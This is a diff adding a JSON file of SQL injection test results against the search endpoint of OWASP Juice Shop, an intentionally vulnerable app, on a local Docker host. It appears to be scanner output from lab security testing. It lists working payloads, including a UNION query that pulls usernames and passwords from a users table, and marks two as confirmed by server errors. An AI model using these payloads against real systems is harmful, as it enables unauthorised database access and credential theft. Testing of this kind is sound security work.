@@ -1,0 +1,57 @@
+[
+  {
+    "payload": "1' OR '1'='1",
+    "technique": "basic_quote_breakout",
+    "description": "Classic quote-breakout, confirms basic injection point",
+    "confirmed": false,
+    "evidence": "no_anomaly_detected",
+    "target": "juiceshop",
+    "url": "http://host.docker.internal:3000/rest/products/search",
+    "param": "q",
+    "vuln_type": "sqli"
+  },
+  {
+    "payload": "1 OR 1=1",
+    "technique": "quote_free_bypass",
+    "description": "No-quote variant - bypasses naive quote-escaping filters",
+    "confirmed": false,
+    "evidence": "no_anomaly_detected",
+    "target": "juiceshop",
+    "url": "http://host.docker.internal:3000/rest/products/search",
+    "param": "q",
+    "vuln_type": "sqli"
+  },
+  {
+    "payload": "1' UNION SELECT user, password FROM users #",
+    "technique": "union_data_exfiltration",
+    "description": "UNION-based extraction - confirms actual data exfiltration impact",
+    "confirmed": true,
+    "evidence": "status_code_anomaly (status=500)",
+    "target": "juiceshop",
+    "url": "http://host.docker.internal:3000/rest/products/search",
+    "param": "q",
+    "vuln_type": "sqli"
+  },
+  {
+    "payload": "1' AND '1'='2",
+    "technique": "logical_control_check",
+    "description": "False-condition control test - confirms DB evaluates injected logic",
+    "confirmed": false,
+    "evidence": "no_anomaly_detected",
+    "target": "juiceshop",
+    "url": "http://host.docker.internal:3000/rest/products/search",
+    "param": "q",
+    "vuln_type": "sqli"
+  },
+  {
+    "payload": "'(",
+    "technique": "error_trigger_probe",
+    "description": "Minimal quote+paren probe - confirmed to trigger a server error on Juice Shop's search endpoint in baseline scan",
+    "confirmed": true,
+    "evidence": "status_code_anomaly (status=500)",
+    "target": "juiceshop",
+    "url": "http://host.docker.internal:3000/rest/products/search",
+    "param": "q",
+    "vuln_type": "sqli"
+  }
+]
